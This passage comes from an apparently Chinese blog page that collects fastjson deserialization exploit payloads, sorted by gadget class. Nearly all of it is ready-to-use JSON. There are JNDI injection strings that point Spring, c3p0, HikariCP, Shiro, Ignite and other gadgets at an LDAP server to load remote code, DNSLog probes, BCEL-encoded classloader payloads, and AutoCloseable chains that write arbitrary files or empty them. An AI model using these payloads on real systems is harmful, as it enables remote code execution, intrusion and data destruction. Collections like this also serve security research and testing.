+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">     <span class="punctuation">]</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;adviceBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>WrapperConnectionPoolDataSource</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap:aced000...6f;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JndiRefForwardingDataSource</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loginTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>InetAddress</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.InetAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Inet6Address</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>URL</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JSONObject</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>URLReader</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;poc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:9999&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>AutoCloseable 任意文件写入</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/target&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filecontent&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>BasicDataSource</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span> <span class="punctuation">:</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JndiConverter</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AsText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JtaTransactionConfig</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JndiObjectFactory</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>AnterosDBCPConfig</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>AnterosDBCPConfig2</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>CacheJndiTmLookup</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>AutoCloseable 清空指定文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>AutoCloseable 清空指定文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>AutoCloseable 任意文件写入</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.solr.common.util.FastOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tempBuffer&quot;</span><span class="punctuation">:</span><span class="string">&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sink&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">38</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;close&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.iq80.snappy.SnappyOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>BasicDataSource</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>HikariConfig</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>HikariConfig</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>HikariConfig</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>HikariConfig</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>SessionBeanProvider</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JMSContentInterceptor</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>ContextClassLoaderSwitcher</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;contextClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>OracleManagedConnectionFactory</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;xaDataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JNDIConfiguration</p>
